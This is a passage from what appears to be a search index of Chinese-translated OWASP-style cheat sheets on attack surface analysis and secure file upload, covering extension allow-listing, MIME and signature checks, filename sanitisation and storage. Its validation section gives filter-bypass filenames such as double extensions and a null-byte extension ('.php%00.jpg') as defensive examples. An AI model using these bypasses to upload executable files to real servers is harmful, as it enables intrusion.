\u4e0a\u4f20\u7684\u6587\u4ef6\uff0c\u8fd9\u4e9b\u66f4\u6539\u4e2d\u7684\u6bcf\u4e00\u4e2a\u90fd\u4f1a\u518d\u6b21\u5177\u6709\u4e0d\u540c\u7684\u98ce\u9669\u6982\u51b5 - \u67e5\u770b\u66f4\u6539\u662f\u5426\u9002\u5408\u73b0\u6709\u7684\u5b58\u50a8\u6876\uff0c\u67e5\u770b\u73b0\u6709\u7684\u63a7\u5236\u548c\u4fdd\u62a4\u662f\u5426\u9002\u7528\u3002\u5982\u679c\u60a8\u8981\u6dfb\u52a0\u4e0d\u5c5e\u4e8e\u73b0\u6709\u5b58\u50a8\u6876\u7684\u5185\u5bb9\uff0c\u8fd9\u610f\u5473\u7740\u60a8\u5fc5\u987b\u8fdb\u884c\u66f4\u5f7b\u5e95\u7684\u98ce\u9669\u8bc4\u4f30\uff0c\u4ee5\u4e86\u89e3\u60a8\u53ef\u80fd\u4f1a\u6253\u5f00\u4ec0\u4e48\u6837\u7684\u5b89\u5168\u6f0f\u6d1e\u4ee5\u53ca\u60a8\u9700\u8981\u91c7\u53d6\u54ea\u4e9b\u4fdd\u62a4\u63aa\u65bd\u3002</p> <p>\u4f1a\u8bdd\u7ba1\u7406\u3001\u8eab\u4efd\u9a8c\u8bc1\u548c\u5bc6\u7801\u7ba1\u7406\u7684\u66f4\u6539\u76f4\u63a5\u5f71\u54cd\u653b\u51fb\u9762\uff0c\u9700\u8981\u8fdb\u884c\u5ba1\u67e5\u3002\u6388\u6743\u548c\u8bbf\u95ee\u63a7\u5236\u903b\u8f91\u7684\u66f4\u6539\u4e5f\u662f\u5982\u6b64\uff0c\u7279\u522b\u662f\u6dfb\u52a0\u6216\u66f4\u6539\u89d2\u8272\u5b9a\u4e49\uff0c\u6dfb\u52a0\u5177\u6709\u9ad8\u6743\u9650\u7684\u7ba1\u7406\u5458\u7528\u6237\u6216\u7ba1\u7406\u5458\u529f\u80fd\u3002\u5bf9\u4e8e\u5904\u7406\u52a0\u5bc6\u548c\u79d8\u5bc6\u7684\u4ee3\u7801\u7684\u66f4\u6539\u4e5f\u662f\u5982\u6b64\u3002\u5bf9\u6570\u636e\u9a8c\u8bc1\u65b9\u5f0f\u7684\u6839\u672c\u6539\u53d8\u3002\u4ee5\u53ca\u5bf9\u5206\u5c42\u548c\u4fe1\u4efb\u5173\u7cfb\u7684\u91cd\u5927\u67b6\u6784\u66f4\u6539\uff0c\u6216\u6280\u672f\u67b6\u6784\u7684\u6839\u672c\u66f4\u6539\u2014\u2014\u6362\u51fa\u60a8\u7684 Web \u670d\u52a1\u5668\u6216\u6570\u636e\u5e93\u5e73\u53f0\uff0c\u6216\u66f4\u6539\u8fd0\u884c\u65f6\u64cd\u4f5c\u7cfb\u7edf\u3002</p> <p>\u5f53\u60a8\u6dfb\u52a0\u65b0\u7684\u7528\u6237\u7c7b\u578b\u6216\u89d2\u8272\u6216\u6743\u9650\u7ea7\u522b\u65f6\uff0c\u60a8\u4f1a\u8fdb\u884c\u76f8\u540c\u7c7b\u578b\u7684\u5206\u6790\u548c\u98ce\u9669\u8bc4\u4f30\u3002\u8986\u76d6\u6570\u636e\u548c\u529f\u80fd\u7684\u8bbf\u95ee\u7c7b\u578b\uff0c\u5e76\u67e5\u627e\u95ee\u9898\u548c\u4e0d\u4e00\u81f4\u4e4b\u5904\u3002\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u7684\u8bbf\u95ee\u6a21\u578b\u5f88\u91cd\u8981\uff0c\u65e0\u8bba\u662f\u79ef\u6781\u7684\uff08\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u62d2\u7edd\u8bbf\u95ee\uff09\u8fd8\u662f\u6d88\u6781\u7684\uff08\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5141\u8bb8\u8bbf\u95ee\uff09\u3002\u5728\u79ef\u6781\u7684\u8bbf\u95ee\u6a21\u578b\u4e2d\uff0c\u5728\u5b9a\u4e49\u5141\u8bb8\u65b0\u7528\u6237\u7c7b\u578b\u6216\u89d2\u8272\u4f7f\u7528\u54ea\u4e9b\u6570\u636e\u6216\u529f\u80fd\u65b9\u9762\u7684\u4efb\u4f55\u9519\u8bef\u90fd\u5f88\u5bb9\u6613\u88ab\u53d1\u73b0\u3002\u5728\u6d88\u6781\u8bbf\u95ee\u6a21\u578b\u4e2d\uff0c\u60a8\u5fc5\u987b\u66f4\u52a0\u5c0f\u5fc3\uff0c\u4ee5\u786e\u4fdd\u7528\u6237\u65e0\u6cd5\u8bbf\u95ee\u4ed6\u4eec\u4e0d\u5e94\u88ab\u5141\u8bb8\u8bbf\u95ee\u7684\u6570\u636e/\u529f\u80fd\u3002</p> <p>\u8fd9\u79cd\u5a01\u80c1\u6216\u98ce\u9669\u8bc4\u4f30\u53ef\u4ee5\u5b9a\u671f\u8fdb\u884c\uff0c\u6216\u8005\u4f5c\u4e3a\u4e32\u884c/\u5206\u9636\u6bb5/\u87ba\u65cb\u5f0f/\u7011\u5e03\u5f0f\u5f00\u53d1\u9879\u76ee\u4e2d\u8bbe\u8ba1\u5de5\u4f5c\u7684\u4e00\u90e8\u5206\uff0c\u6216\u8005\u5728\u654f\u6377/\u8fed\u4ee3\u5f00\u53d1\u4e2d\u8fde\u7eed\u9012\u589e\u5730\u8fdb\u884c\u3002</p> <p>\u901a\u5e38\uff0c\u968f\u7740\u60a8\u6dfb\u52a0\u66f4\u591a\u754c\u9762\u548c\u7528\u6237\u7c7b\u578b\u5e76\u4e0e\u5176\u4ed6\u7cfb\u7edf\u96c6\u6210\uff0c\u5e94\u7528\u7a0b\u5e8f\u7684\u653b\u51fb\u9762\u4f1a\u968f\u7740\u65f6\u95f4\u7684\u63a8\u79fb\u800c\u589e\u52a0\u3002\u60a8\u8fd8\u5e0c\u671b\u901a\u8fc7\u7b80\u5316\u6a21\u578b\uff08\u4f8b\u5982\uff0c\u51cf\u5c11\u7528\u6237\u7ea7\u522b\u7684\u6570\u91cf\u6216\u4e0d\u5b58\u50a8\u60a8\u7edd\u5bf9\u4e0d\u9700\u8981\u7684\u673a\u5bc6\u6570\u636e\uff09\u3001\u5173\u95ed\u529f\u80fd\u548c\u901a\u8fc7\u5f15\u5165\u8bf8\u5982 Web \u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899 (WAF) \u548c\u5b9e\u65f6\u7279\u5b9a\u4e8e\u5e94\u7528\u7a0b\u5e8f\u7684\u653b\u51fb\u68c0\u6d4b\u4e4b\u7c7b\u7684\u64cd\u4f5c\u63a7\u5236\u6765\u51cf\u5c11\u672a\u4f7f\u7528\u7684\u63a5\u53e3\u3002</p>"},{"location":"CheetSheet/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","title":"\u6587\u4ef6\u4e0a\u4f20","text":""},{"location":"CheetSheet/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_1","title":"\u4ecb\u7ecd\u00b6","text":"<p>\u6587\u4ef6\u4e0a\u4f20\u6b63\u6210\u4e3a\u4efb\u4f55\u5e94\u7528\u7a0b\u5e8f\u4e2d\u8d8a\u6765\u8d8a\u91cd\u8981\u7684\u90e8\u5206\uff0c\u7528\u6237\u53ef\u4ee5\u5728\u5176\u4e2d\u4e0a\u4f20\u4ed6\u4eec\u7684\u7167\u7247\u3001\u7b80\u5386\u6216\u5c55\u793a\u4ed6\u4eec\u6b63\u5728\u4ece\u4e8b\u7684\u9879\u76ee\u7684\u89c6\u9891\u3002\u5e94\u7528\u7a0b\u5e8f\u5e94\u8be5\u80fd\u591f\u4ee5\u4e00\u79cd\u4fdd\u62a4\u5e94\u7528\u7a0b\u5e8f\u548c\u7528\u6237\u5b89\u5168\u7684\u65b9\u5f0f\u62b5\u5fa1\u865a\u5047\u548c\u6076\u610f\u6587\u4ef6\u3002</p> <p>\u603b\u4e4b\uff0c\u8981\u8fbe\u5230\u5b89\u5168\u7684\u6587\u4ef6\u4e0a\u4f20\u5b9e\u73b0\uff0c\u5e94\u9075\u5faa\u4ee5\u4e0b\u539f\u5219\uff1a</p> <ul> <li>\u5217\u51fa\u5141\u8bb8\u7684\u6269\u5c55\u540d\u3002\u53ea\u5141\u8bb8\u5bf9\u4e1a\u52a1\u529f\u80fd\u8fdb\u884c\u5b89\u5168\u548c\u5173\u952e\u7684\u6269\u5c55</li> <li>\u786e\u4fdd\u5728\u9a8c\u8bc1\u6269\u5c55\u4e4b\u524d\u5e94\u7528\u8f93\u5165\u9a8c\u8bc1\u3002</li> <li>\u9a8c\u8bc1\u6587\u4ef6\u7c7b\u578b\uff0c\u4e0d\u8981\u76f8\u4fe1Content-Type \u6807\u5934\uff0c\u56e0\u4e3a\u5b83\u53ef\u80fd\u88ab\u6b3a\u9a97</li> <li>\u5c06\u6587\u4ef6\u540d\u66f4\u6539\u4e3a\u5e94\u7528\u7a0b\u5e8f\u751f\u6210\u7684\u540d\u79f0</li> <li>\u8bbe\u7f6e\u6587\u4ef6\u540d\u957f\u5ea6\u9650\u5236\u3002\u5c3d\u53ef\u80fd\u9650\u5236\u5141\u8bb8\u7684\u5b57\u7b26</li> <li>\u8bbe\u7f6e\u6587\u4ef6\u5927\u5c0f\u9650\u5236</li> <li>\u53ea\u5141\u8bb8\u6388\u6743\u7528\u6237\u4e0a\u4f20\u6587\u4ef6</li> <li>\u5c06\u6587\u4ef6\u5b58\u50a8\u5728\u4e0d\u540c\u7684\u670d\u52a1\u5668\u4e0a\u3002\u5982\u679c\u90a3\u4e0d\u53ef\u80fd\uff0c\u8bf7\u5c06\u5b83\u4eec\u5b58\u50a8\u5728 webroot \u4e4b\u5916</li> <li>\u5728\u516c\u5f00\u8bbf\u95ee\u6587\u4ef6\u7684\u60c5\u51b5\u4e0b\uff0c\u4f7f\u7528\u6620\u5c04\u5230\u5e94\u7528\u7a0b\u5e8f\u5185\u90e8\u6587\u4ef6\u540d\u7684\u5904\u7406\u7a0b\u5e8f\uff08someid -&gt; file.ext\uff09</li> <li>\u901a\u8fc7\u9632\u75c5\u6bd2\u8f6f\u4ef6\u6216\u6c99\u7bb1\u8fd0\u884c\u6587\u4ef6\uff08\u5982\u679c\u53ef\u7528\uff09\u4ee5\u9a8c\u8bc1\u5b83\u4e0d\u5305\u542b\u6076\u610f\u6570\u636e</li> <li>\u786e\u4fdd\u4f7f\u7528\u7684\u4efb\u4f55\u5e93\u90fd\u7ecf\u8fc7\u5b89\u5168\u914d\u7f6e\u5e76\u4fdd\u6301\u6700\u65b0</li> <li>\u4fdd\u62a4\u6587\u4ef6\u4e0a\u4f20\u514d\u53d7CSRF\u653b\u51fb</li> </ul>"},{"location":"CheetSheet/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_2","title":"\u6587\u4ef6\u4e0a\u4f20\u5a01\u80c1\u00b6","text":"<p>\u4e3a\u4e86\u8bc4\u4f30\u5e76\u786e\u5207\u4e86\u89e3\u8981\u5b9e\u65bd\u54ea\u4e9b\u63a7\u5236\u63aa\u65bd\uff0c\u4e86\u89e3\u60a8\u6240\u9762\u4e34\u7684\u95ee\u9898\u5bf9\u4e8e\u4fdd\u62a4\u60a8\u7684\u8d44\u4ea7\u81f3\u5173\u91cd\u8981\u3002\u4ee5\u4e0b\u90e8\u5206\u6709\u671b\u5c55\u793a\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\u5e26\u6765\u7684\u98ce\u9669\u3002</p>"},{"location":"CheetSheet/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_3","title":"\u6076\u610f\u6587\u4ef6\u00b6","text":"<p>\u653b\u51fb\u8005\u51fa\u4e8e\u6076\u610f\u63d0\u4f9b\u6587\u4ef6\uff0c\u4f8b\u5982\uff1a</p> <ol> <li>\u5229\u7528\u6587\u4ef6\u89e3\u6790\u5668\u6216\u5904\u7406\u6a21\u5757\u4e2d\u7684\u6f0f\u6d1e\uff08\u4f8b\u5982 ImageTrick Exploit\uff0cXXE\uff09</li> <li>\u4f7f\u7528\u8be5\u6587\u4ef6\u8fdb\u884c\u7f51\u7edc\u9493\u9c7c\uff08\u4f8b\u5982\u804c\u4e1a\u8868\u683c\uff09</li> <li>\u53d1\u9001 ZIP \u70b8\u5f39\u3001XML \u70b8\u5f39\uff08\u4e5f\u79f0\u4e3a billion laughs \u653b\u51fb\uff09\u6216\u53ea\u662f\u5927\u6587\u4ef6\u4ee5\u586b\u6ee1\u670d\u52a1\u5668\u5b58\u50a8\u7a7a\u95f4\uff0c\u4ece\u800c\u963b\u788d\u548c\u7834\u574f\u670d\u52a1\u5668\u7684\u53ef\u7528\u6027</li> <li>\u8986\u76d6\u7cfb\u7edf\u4e0a\u7684\u73b0\u6709\u6587\u4ef6</li> <li>\u5982\u679c\u6587\u4ef6\u53ef\u516c\u5f00\u68c0\u7d22\uff0c\u53ef\u80fd\u4f1a\u5371\u53ca\u5176\u4ed6\u7528\u6237\u7684\u5ba2\u6237\u7aef\u6d3b\u52a8\u5185\u5bb9\uff08XSS\u3001CSRF \u7b49\uff09\u3002</li> </ol>"},{"location":"CheetSheet/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_4","title":"\u516c\u5171\u6587\u4ef6\u68c0\u7d22\u00b6","text":"<p>\u5982\u679c\u4e0a\u4f20\u7684\u6587\u4ef6\u53ef\u516c\u5f00\u68c0\u7d22\uff0c\u5219\u53ef\u4ee5\u89e3\u51b3\u5176\u4ed6\u5a01\u80c1\uff1a</p> <ol> <li>\u516c\u5f00\u62ab\u9732\u5176\u4ed6\u6587\u4ef6</li> <li>\u901a\u8fc7\u8bf7\u6c42\u5927\u91cf\u6587\u4ef6\u53d1\u8d77 DoS \u653b\u51fb\u3002\u8bf7\u6c42\u5f88\u5c0f\uff0c\u4f46\u54cd\u5e94\u5374\u5927\u5f97\u591a</li> <li>\u53ef\u80fd\u88ab\u89c6\u4e3a\u975e\u6cd5\u3001\u653b\u51fb\u6027\u6216\u5371\u9669\u7684\u6587\u4ef6\u5185\u5bb9\uff08\u4f8b\u5982\u4e2a\u4eba\u6570\u636e\u3001\u53d7\u7248\u6743\u4fdd\u62a4\u7684\u6570\u636e\u7b49\uff09\uff0c\u8fd9\u5c06\u4f7f\u60a8\u6210\u4e3a\u6b64\u7c7b\u6076\u610f\u6587\u4ef6\u7684\u5bbf\u4e3b\u3002</li> </ol>"},{"location":"CheetSheet/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_5","title":"\u6587\u4ef6\u4e0a\u4f20\u4fdd\u62a4\u00b6","text":"<p>\u9a8c\u8bc1\u7528\u6237\u5185\u5bb9\u6ca1\u6709\u7075\u4e39\u5999\u836f\u3002\u5b9e\u65bd\u6df1\u5ea6\u9632\u5fa1\u65b9\u6cd5\u662f\u4f7f\u4e0a\u4f20\u8fc7\u7a0b\u66f4\u52a0\u56f0\u96be\u5e76\u66f4\u52a0\u9501\u5b9a\u670d\u52a1\u9700\u6c42\u548c\u8981\u6c42\u7684\u5173\u952e\u3002\u5b9e\u65bd\u591a\u79cd\u6280\u672f\u662f\u5173\u952e\u548c\u5efa\u8bae\uff0c\u56e0\u4e3a\u6ca1\u6709\u4e00\u79cd\u6280\u672f\u8db3\u4ee5\u4fdd\u62a4\u670d\u52a1\u3002</p>"},{"location":"CheetSheet/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_6","title":"\u6269\u5c55\u9a8c\u8bc1\u00b6","text":"<p>\u786e\u4fdd\u5728\u89e3\u7801\u6587\u4ef6\u540d\u540e\u8fdb\u884c\u9a8c\u8bc1\uff0c\u5e76\u8bbe\u7f6e\u9002\u5f53\u7684\u8fc7\u6ee4\u5668\u4ee5\u907f\u514d\u67d0\u4e9b\u5df2\u77e5\u7684\u7ed5\u8fc7\uff0c\u4f8b\u5982\uff1a</p> <ul> <li>\u53cc\u6269\u5c55\uff0c\u4f8b\u5982 <code>.jpg.php</code>\uff0c\u5b83\u5f88\u5bb9\u6613\u7ed5\u8fc7\u6b63\u5219\u8868\u8fbe\u5f0f<code>\\.jpg</code></li> <li>\u7a7a\u5b57\u8282\uff0c\u4f8b\u5982 <code>.php%00.jpg</code>\uff0c\u5176\u4e2d<code>.jpg</code>\u88ab\u622a\u65ad\u5e76<code>.php</code>\u6210\u4e3a\u65b0\u7684\u6269\u5c55\u540d</li> <li>\u672a\u7ecf\u9002\u5f53\u6d4b\u8bd5\u548c\u5ba1\u67e5\u7684\u901a\u7528\u9519\u8bef\u6b63\u5219\u8868\u8fbe\u5f0f\u3002\u9664\u975e\u60a8\u5bf9\u8fd9\u4e2a\u4e3b\u9898\u6709\u8db3\u591f\u7684\u4e86\u89e3\uff0c\u5426\u5219\u4e0d\u8981\u5efa\u7acb\u81ea\u5df1\u7684\u903b\u8f91\u3002</li> </ul> <p>\u8bf7\u53c2\u9605\u8f93\u5165\u9a8c\u8bc1 CS\u4ee5\u6b63\u786e\u89e3\u6790\u548c\u5904\u7406\u6269\u5c55\u3002</p>"},{"location":"CheetSheet/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_7","title":"\u5217\u51fa\u5141\u8bb8\u7684\u6269\u5c55\u00b6","text":"<p>\u786e\u4fdd\u4ec5\u4f7f\u7528\u5173\u952e\u4e1a\u52a1\u6269\u5c55\uff0c\u4e0d\u5141\u8bb8\u4efb\u4f55\u7c7b\u578b\u7684\u975e\u5fc5\u9700\u6269\u5c55\u3002\u4f8b\u5982\uff0c\u5982\u679c\u7cfb\u7edf\u8981\u6c42\uff1a</p> <ul> <li>\u56fe\u7247\u4e0a\u4f20\uff0c\u5141\u8bb8\u4e00\u79cd\u7b26\u5408\u4e1a\u52a1\u9700\u6c42\u7684\u7ea6\u5b9a\u7c7b\u578b\uff1b</li> <li>\u7b80\u5386\u4e0a\u4f20\uff0c\u5141\u8bb8<code>docx</code>\u548c<code>pdf</code>\u6269\u5c55\u3002</li> </ul> <p>\u6839\u636e\u5e94\u7528\u7a0b\u5e8f\u7684\u9700\u8981\uff0c\u786e\u4fdd\u4f7f\u7528\u5371\u5bb3\u6700\u5c0f\u548c\u98ce\u9669\u6700\u4f4e\u7684\u6587\u4ef6\u7c7b\u578b\u3002</p>"},{"location":"CheetSheet/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_8","title":"\u5757\u6269\u5c55\u00b6","text":"<p>\u8bc6\u522b\u6f5c\u5728\u6709\u5bb3\u7684\u6587\u4ef6\u7c7b\u578b\u5e76\u963b\u6b62\u60a8\u8ba4\u4e3a\u5bf9\u60a8\u7684\u670d\u52a1\u6709\u5bb3\u7684\u6269\u5c55\u540d\u3002</p> <p>\u8bf7\u6ce8\u610f\uff0c\u963b\u6b62\u7279\u5b9a\u6269\u5c55\u672c\u8eab\u662f\u4e00\u79cd\u8584\u5f31\u7684\u4fdd\u62a4\u65b9\u6cd5\u3002Unrestricted File Upload \u6f0f\u6d1e\u6587\u7ae0\u63cf\u8ff0\u4e86\u653b\u51fb\u8005\u5982\u4f55\u5c1d\u8bd5\u7ed5\u8fc7\u6b64\u7c7b\u68c0\u67e5\u3002</p>"},{"location":"CheetSheet/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_9","title":"\u5185\u5bb9\u7c7b\u578b\u9a8c\u8bc1\u00b6","text":"<p>\u4e0a\u4f20\u6587\u4ef6\u7684 Content-Type \u7531\u7528\u6237\u63d0\u4f9b\uff0c\u56e0\u6b64\u4e0d\u53ef\u4fe1\uff0c\u56e0\u4e3a\u5b83\u5f88\u5bb9\u6613\u88ab\u6b3a\u9a97\u3002\u867d\u7136\u4e0d\u5e94\u4f9d\u8d56\u5b83\u6765\u786e\u4fdd\u5b89\u5168\uff0c\u4f46\u5b83\u63d0\u4f9b\u4e86\u5feb\u901f\u68c0\u67e5\u4ee5\u9632\u6b62\u7528\u6237\u65e0\u610f\u4e2d\u4e0a\u4f20\u7c7b\u578b\u4e0d\u6b63\u786e\u7684\u6587\u4ef6\u3002</p> <p>\u9664\u4e86\u5b9a\u4e49\u4e0a\u4f20\u6587\u4ef6\u7684\u6269\u5c55\u540d\u5916\uff0c\u8fd8\u53ef\u4ee5\u68c0\u67e5\u5176 MIME \u7c7b\u578b\u4ee5\u5feb\u901f\u9632\u6b62\u7b80\u5355\u7684\u6587\u4ef6\u4e0a\u4f20\u653b\u51fb\u3002</p> <p>\u8fd9\u6700\u597d\u901a\u8fc7\u5141\u8bb8\u5217\u8868\u65b9\u6cd5\u6765\u5b8c\u6210\uff1b\u5426\u5219\uff0c\u8fd9\u53ef\u4ee5\u901a\u8fc7\u963b\u6b62\u5217\u8868\u65b9\u6cd5\u6765\u5b8c\u6210\u3002</p>"},{"location":"CheetSheet/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_10","title":"\u6587\u4ef6\u7b7e\u540d\u9a8c\u8bc1\u00b6","text":"<p>\u7ed3\u5408\u5185\u5bb9\u7c7b\u578b\u9a8c\u8bc1\uff0c\u53ef\u4ee5\u6839\u636e\u5e94\u63a5\u6536\u7684\u9884\u671f\u6587\u4ef6\u68c0\u67e5\u548c\u9a8c\u8bc1\u6587\u4ef6\u7684\u7b7e\u540d\u9a8c\u8bc1\u3002</p> <p>\u8fd9\u4e0d\u5e94\u8be5\u5355\u72ec\u4f7f\u7528\uff0c\u56e0\u4e3a\u7ed5\u8fc7\u5b83\u5f88\u5e38\u89c1\u4e5f\u5f88\u5bb9\u6613\u3002</p>"},{"location":"CheetSheet/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_11","title":"\u6587\u4ef6\u540d\u6e05\u7406\u00b6","text":"<p>\u6587\u4ef6\u540d\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u5371\u53ca\u7cfb\u7edf\uff0c\u6216\u8005\u901a\u8fc7\u4f7f\u7528\u4e0d\u53ef\u63a5\u53d7\u7684\u5b57\u7b26\uff0c\u6216\u8005\u901a\u8fc7\u4f7f\u7528\u7279\u6b8a\u548c\u53d7\u9650\u7684\u6587\u4ef6\u540d\u3002\u5bf9\u4e8e Windows\uff0c\u8bf7\u53c2\u9605\u4ee5\u4e0bMSDN \u6307\u5357\u3002\u6709\u5173\u4e0d\u540c\u6587\u4ef6\u7cfb\u7edf\u53ca\u5176\u5904\u7406\u6587\u4ef6\u65b9\u5f0f\u7684\u66f4\u5e7f\u6cdb\u6982\u8ff0\uff0c\u8bf7\u53c2\u9605\u7ef4\u57fa\u767e\u79d1\u7684\u6587\u4ef6\u540d\u9875\u9762\u3002</p> <p>\u4e3a\u4e86\u907f\u514d\u4e0a\u8ff0\u5a01\u80c1\uff0c\u521b\u5efa\u4e00\u4e2a\u968f\u673a\u5b57\u7b26\u4e32\u4f5c\u4e3a\u6587\u4ef6\u540d\uff0c\u4f8b\u5982\u751f\u6210\u4e00\u4e2a UUID/GUID\uff0c\u662f\u5fc5\u4e0d\u53ef\u5c11\u7684\u3002\u5982\u679c\u4e1a\u52a1\u9700\u6c42\u9700\u8981\u6587\u4ef6\u540d\uff0c\u5219\u5e94\u5bf9\u5ba2\u6237\u7aef\uff08\u4f8b\u5982\u5bfc\u81f4 XSS \u548c CSRF \u653b\u51fb\u7684\u6d3b\u52a8\u5185\u5bb9\uff09\u548c\u540e\u7aef\uff08\u4f8b\u5982\u7279\u6b8a\u6587\u4ef6\u8986\u76d6\u6216\u521b\u5efa\uff09\u653b\u51fb\u5411\u91cf\u8fdb\u884c\u9002\u5f53\u7684\u8f93\u5165\u9a8c\u8bc1\u3002\u5e94\u6839\u636e\u5b58\u50a8\u6587\u4ef6\u7684\u7cfb\u7edf\u8003\u8651\u6587\u4ef6\u540d\u957f\u5ea6\u9650\u5236\uff0c\u56e0\u4e3a\u6bcf\u4e2a\u7cfb\u7edf\u90fd\u6709\u81ea\u5df1\u7684\u6587\u4ef6\u540d\u957f\u5ea6\u9650\u5236\u3002\u5982\u679c\u9700\u8981\u7528\u6237\u6587\u4ef6\u540d\uff0c\u8bf7\u8003\u8651\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\uff1a</p> <ul> <li>\u5b9e\u73b0\u6700\u5927\u957f\u5ea6</li> <li>\u5c06\u5b57\u7b26\u5177\u4f53\u9650\u5236\u5728\u5141\u8bb8\u7684\u5b50\u96c6\u4e2d\uff0c\u4f8b\u5982\u5b57\u6bcd\u6570\u5b57\u5b57\u7b26\u3001\u8fde\u5b57\u7b26\u3001\u7a7a\u683c\u548c\u53e5\u70b9</li> <li>\u5982\u679c\u8fd9\u4e0d\u53ef\u80fd\uff0c\u8bf7\u963b\u6b62\u5217\u51fa\u53ef\u80fd\u5371\u53ca\u5b58\u50a8\u548c\u4f7f\u7528\u6587\u4ef6\u7684\u6846\u67b6\u548c\u7cfb\u7edf\u7684\u5371\u9669\u5b57\u7b26\u3002</li> </ul>"},{"location":"CheetSheet/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_12","title":"\u6587\u4ef6\u5185\u5bb9\u9a8c\u8bc1\u00b6","text":"<p>\u5982\u516c\u5171\u6587\u4ef6\u68c0\u7d22\u90e8\u5206\u6240\u8ff0\uff0c\u6587\u4ef6\u5185\u5bb9\u53ef\u80fd\u5305\u542b\u6076\u610f\u3001\u4e0d\u5f53\u6216\u975e\u6cd5\u6570\u636e\u3002</p> <p>\u6839\u636e\u9884\u671f\u7c7b\u578b\uff0c\u53ef\u4ee5\u5e94\u7528\u7279\u6b8a\u6587\u4ef6\u5185\u5bb9\u9a8c\u8bc1\uff1a</p> <ul> <li>\u5bf9\u4e8e\u56fe\u50cf\uff0c\u5e94\u7528\u56fe\u50cf\u91cd\u5199\u6280\u672f\u53ef\u4ee5\u7834\u574f\u4efb\u4f55\u6ce8\u5165\u56fe\u50cf\u7684\u6076\u610f\u5185\u5bb9\uff1b\u8fd9\u53ef\u4ee5\u901a\u8fc7\u968f\u673a\u5316\u6765\u5b8c\u6210\u3002</li> <li>\u5bf9\u4e8eMicrosoft \u6587\u6863\uff0c\u4f7f\u7528Apache POI\u6709\u52a9\u4e8e\u9a8c\u8bc1\u4e0a\u4f20\u7684\u6587\u6863\u3002</li> <li>\u4e0d\u5efa\u8bae\u4f7f\u7528ZIP \u6587\u4ef6\uff0c\u56e0\u4e3a\u5b83\u4eec\u53ef\u4ee5\u5305\u542b\u6240\u6709\u7c7b\u578b\u7684\u6587\u4ef6\uff0c\u5e76\u4e14\u4e0e\u5b83\u4eec\u76f8\u5173\u7684\u653b\u51fb\u5a92\u4ecb\u5f88\u591a\u3002</li> </ul> <p>\u6587\u4ef6\u4e0a\u4f20\u670d\u52a1\u5e94\u5141\u8bb8\u7528\u6237\u4e3e\u62a5\u975e\u6cd5\u5185\u5bb9\uff0c\u5e76\u5141\u8bb8\u7248\u6743\u6240\u6709\u8005\u4e3e\u62a5\u6ee5\u7528\u884c\u4e3a\u3002</p> <p>\u5982\u679c\u6709\u8db3\u591f\u7684\u8d44\u6e90\uff0c\u5728\u5411\u516c\u4f17\u53d1\u5e03\u6587\u4ef6\u4e4b\u524d\uff0c\u5e94\u8be5\u5728\u6c99\u76d2\u73af\u5883\u4e2d\u8fdb\u884c\u624b\u52a8\u6587\u4ef6\u5ba1\u67e5\u3002</p> <p>\u5728\u5ba1\u67e5\u4e2d\u6dfb\u52a0\u4e00\u4e9b\u81ea\u52a8\u5316\u53ef\u80fd\u4f1a\u6709\u6240\u5e2e\u52a9\uff0c\u8fd9\u662f\u4e00\u4e2a\u82db\u523b\u7684\u8fc7\u7a0b\uff0c\u5e94\u8be5\u5728\u4f7f\u7528\u524d\u4ed4\u7ec6\u7814\u7a76\u3002\u4e00\u4e9b\u670d\u52a1\uff08\u4f8b\u5982Virus Total\uff09\u63d0\u4f9b API \u6765\u6839\u636e\u4f17\u6240\u5468\u77e5\u7684\u6076\u610f\u6587\u4ef6\u6563\u5217\u626b\u63cf\u6587\u4ef6\u3002\u4e00\u4e9b\u6846\u67b6\u53ef\u4ee5\u68c0\u67e5\u548c\u9a8c\u8bc1\u539f\u59cb\u5185\u5bb9\u7c7b\u578b\uff0c\u5e76\u6839\u636e\u9884\u5b9a\u4e49\u7684\u6587\u4ef6\u7c7b\u578b\u9a8c\u8bc1\u5b83\uff0c\u4f8b\u5982ASP.NET \u7ed8\u56fe\u5e93\u3002\u8c28\u9632\u6570\u636e\u6cc4\u9732\u5a01\u80c1\u548c\u516c\u5171\u670d\u52a1\u6536\u96c6\u4fe1\u606f\u3002</p>"},{"location":"CheetSheet/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_13","title":"\u6587\u4ef6\u5b58\u50a8\u4f4d\u7f6e\u00b6","text":"<p>\u5fc5\u987b\u6839\u636e\u5b89\u5168\u548c\u4e1a\u52a1\u8981\u6c42\u6765\u9009\u62e9\u5b58\u50a8\u6587\u4ef6\u7684\u4f4d\u7f6e\u3002\u4ee5\u4e0b\u51e0\u70b9\u7531\u5b89\u5168\u4f18\u5148\u7ea7\u8bbe\u7f6e\uff0c\u5e76\u4e14\u5305\u542b\u5728\u5185\uff1a</p> <ol> <li>\u5c06\u6587\u4ef6\u5b58\u50a8\u5728\u4e0d\u540c\u7684\u4e3b\u673a\u4e0a\uff0c\u8fd9\u6837\u53ef\u4ee5\u5b8c\u5168\u5206\u79bb\u4e3a\u7528\u6237\u63d0\u4f9b\u670d\u52a1\u7684\u5e94\u7528\u7a0b\u5e8f\u4e0e\u5904\u7406\u6587\u4ef6\u4e0a\u4f20\u53ca\u5176\u5b58\u50a8\u7684\u4e3b\u673a\u4e4b\u95f4\u7684\u804c\u8d23\u3002</li> 